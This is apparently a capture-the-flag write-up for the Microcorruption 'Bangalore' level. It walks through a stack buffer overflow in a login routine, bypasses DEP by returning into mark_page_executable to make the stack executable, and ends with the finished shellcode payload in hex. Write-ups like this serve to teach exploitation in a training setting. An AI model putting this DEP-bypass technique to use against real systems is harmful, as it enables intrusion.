# Bangalore
> sourse code [here](./dump.asm)  
> **Vulnerability**: stack buffer overflow  
> **Mitigation**: DEP  

## Analysis
pseudo code for `main`, assembly code [here](./dump.asm)
```c
void main() {
    set_up_protection();
    login();
}
```

What do `<set_up_protection>`?
```c
void set_up_protection() {
    mark_page_executable(0);
    int i = 1;
    for (; i < 0x44; i++) {
        mark_page_writable(i);
    }
    for (; i < 0x100; i++) {
        mark_page_executable(i);
    }
    turn_on_dep();
}
```

This function set up the memory protection and make sure a page is never both writable and executable.

What do `<login>`?
```c
void login() {
    ...
    gets(sp, 0x30);     // gets password
    ...
}
```

`<login>` read 0x30 bytes to the stack and return address at `sp + 0x10`. Therefore, with the program able to get `0x30`, the input can be used to overwrite the return address.

### Thought #1: ROP chain
With the **DEP** protection and the program without obvious directy function to unlock the door, probably need **ROP** chain to achieve the goal.
> Stack buffer is no executable, so no jumpping back to the stack and execute.

#### ROP chain
The goal for the ROP chain should be calling `#0x10` with sr set to a certain value to specify the interrupt for unlock.
From both how [`<INT>`](../Hanoi/dump.asm) is called from other program and the interrupt needed from the [manual](https://microcorruption.com/public/manual.pdf):

```asm
457a <INT>
457a:  1e41 0200      mov	0x2(sp), r14        ; 0x2(sp) = argument for specifying the interrupt
457e:  0212           push	sr
4580:  0f4e           mov	r14, r15
4582:  8f10           swpb	r15
4584:  024f           mov	r15, sr
4586:  32d0 0080      bis	#0x8000, sr
458a:  b012 1000      call	#0x10
458e:  3241           pop	sr
4590:  3041           ret
```

The interrupt number is specified by the argument at `sp + 0x2`. The interrupt number for unlock is `0x7f`.
Then, the value for `sr` will be set accordingly to `arg` by `sr = (((arg << 8) & 0xff00) | ((arg >> 8) & 0xff)) | 0x8000`.
Therefore, to unlock the door, the value for `sr` should be `0x7f00 | 0x8000 = 0xff00`.

That is, we need to find the following assembly code in the program:
```asm
; shellcode
3240 00ff      mov	#0xff00, sr
b012 1000      call	#0x10
```


For the ROP chain to work, we have to find the gadget in the program. Find all the `ret` instruction in the program:
```asm
0010 <__trap_interrupt>
0010:  3041           ret
...
445e:  0f4e           mov	r14, r15
4460:  3041           ret
...
4474:  3150 0a00      add	#0xa, sp
4478:  3041           ret
...
4498:  3b41           pop	r11
449a:  3041           ret
...
44ae:  3150 0a00      add	#0xa, sp
44b2:  3041           ret
...
44c6:  3150 0a00      add	#0xa, sp
44ca:  3041           ret
...
44d8:  3150 0600      add	#0x6, sp
44dc:  3041           ret
...
4508:  3b41           pop	r11
450a:  3041           ret
450c:  3041           ret
...
450e <conditional_unlock_door>
450e:  0f43           clr	r15
4510:  3041           ret
...
4538:  3150 1000      add	#0x10, sp
453c:  3041           ret
```
However, none of them is useful for the ROP chain. None of them can give us the ability to modiry the `sr` register; thus, unable to use the **ROP** chain to unlock the door.

### Thought #2: make stack executable
Instead of using the executable section in program, just make the stack executable and the shellcode on the stack directly.

Stack pointer, `sp`, is `0x3fee`, when receiving the input and will take input of size `0x30`. Check which page is the stack in:
(use simple [c code](./test.c) to check pages/memories protection)
```text
rwx	page	address
...
w:	63		0x3f00
w:	64		0x4000
w:	65		0x4100
w:	66		0x4200
w:	67		0x4300
x:	68		0x4400
x:	69		0x4500
x:	70		0x4600
...
```

Therefore, the target is to set the page, `63`, to executable and put the shellcode, `mov #0xff00, sr; call #0x10`, at the beginning of the input and use the buffer from `0x10` to first replace the original return address and set up ROP chain to make *paget 63* executable.

#### Make page executable
Try to call `<mark_page_executable>` directly,
```asm
44b4 <mark_page_executable>
44b4:  0e4f           mov	r15, r14
44b6:  0312           push	#0x0
44b8:  0e12           push	r14
44ba:  3180 0600      sub	#0x6, sp
44be:  3240 0091      mov	#0x9100, sr
44c2:  b012 1000      call	#0x10
44c6:  3150 0a00      add	#0xa, sp
44ca:  3041           ret
```

However, this way we will need to put the page number to `r15` which is impossible.

Looking into the code right before it trigger the interrupt, it pushes `0x0` and `page number` on the stack at `0x44b6 and 0x44b8`. That is, the stack layout should be as the following:
|                |                 stack                  |
| :------------: | :------------------------------------: |
|                |                  ...                   |
| return address |                 0x44ba                 |
|                |                  0x0                   |
|                |                   63                   |
|                | address when return back from `0x44ca` |

After marking the stack executable, the program should jump back to the start of the input where we put the `shellcode`. Therefore, the input should be as following,
| address | `sp`  |                            value                            |
| :-----: | :---: | :---------------------------------------------------------: |
|  3fee   |  +0   |                         *shellcode*                         |
|   ...   |  ...  |                          (padding)                          |
|  3ffe   | +0x10 |      `0x44ba`, address within `<mark_page_executable>`      |
|  4000   | +0x12 |               63, page to mark as executable                |
|  4002   | +0x14 |                             0x0                             |
|  4004   | +0x16 | `0x3fee`, execute *shellcode* after marking page executable |

## Exploit
```python
In [21]: def b2h(b):
    ...:     return ''.join(f'{c:02x}' for c in b)
    ...: 

In [22]: b2h(shellcode.ljust(0x10, b'a') + p16(0x44ba) + p16(63) + p16(0) + p16(0x3fee))
Out[22]: '324000ffb01210006161616161616161ba443f000000ee3f'
```
